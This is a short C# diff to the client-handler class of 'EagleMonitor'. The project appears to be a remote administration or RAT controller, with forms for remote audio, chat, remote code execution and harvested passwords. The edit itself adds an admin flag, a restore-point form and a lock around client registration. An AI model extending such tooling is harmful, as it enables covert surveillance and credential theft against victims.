@@ -8,6 +8,7 @@ using System.Collections.Generic;
 using System.Drawing;
 using System.IO;
 using System.Net.Sockets;
+using System.Threading;
 using System.Windows.Forms;
 
 /* 
@@ -54,6 +55,7 @@ namespace EagleMonitor.Networking
         internal string clientPath { get; set; }
         internal string clientStatus { get; set; }
         internal bool is64bitClient { get; set; }
+        internal bool isAdmin { get; set; }
         internal AudioHelpers audioHelper { get; set; }
 
 
@@ -72,6 +74,7 @@ namespace EagleMonitor.Networking
         internal RemoteAudioForm remoteAudioForm { get; set; }
         internal RemoteChatForm chatForm { get; set; }
         internal RemoteCodeForm remoteCodeForm { get; set; }
+        internal RestorePointForm restorePointForm { get; set; }
 
         internal Dictionary<string, DownloadFileForm> downloadForms;
 
@@ -152,9 +155,12 @@ namespace EagleMonitor.Networking
             {
                 switch (packet.packetType)
                 {
-
                     case PacketType.CONNECTED:
-                        ClientHandler.ClientHandlersList.Add(this.IP, this);
+                        lock (ClientHandlersList) 
+                        {
+                            ClientHandlersList.Add(this.IP, this);
+                        }
+                        Thread.Sleep(50);
                         new PacketHandler(packet, this);
                         break;
 
@@ -379,6 +385,7 @@ namespace EagleMonitor.Networking
                     Utils.Miscellaneous.CloseForm(passwordsForm);
                     Utils.Miscellaneous.CloseForm(chatForm);
                     Utils.Miscellaneous.CloseForm(remoteCodeForm);
+                    Utils.Miscellaneous.CloseForm(restorePointForm);
 
                     foreach (KeyValuePair<string, DownloadFileForm> file in downloadForms) 
                     {
@@ -387,7 +394,6 @@ namespace EagleMonitor.Networking
                     }
                     downloadForms.Clear();
                 }));
-
             }
         }
     }
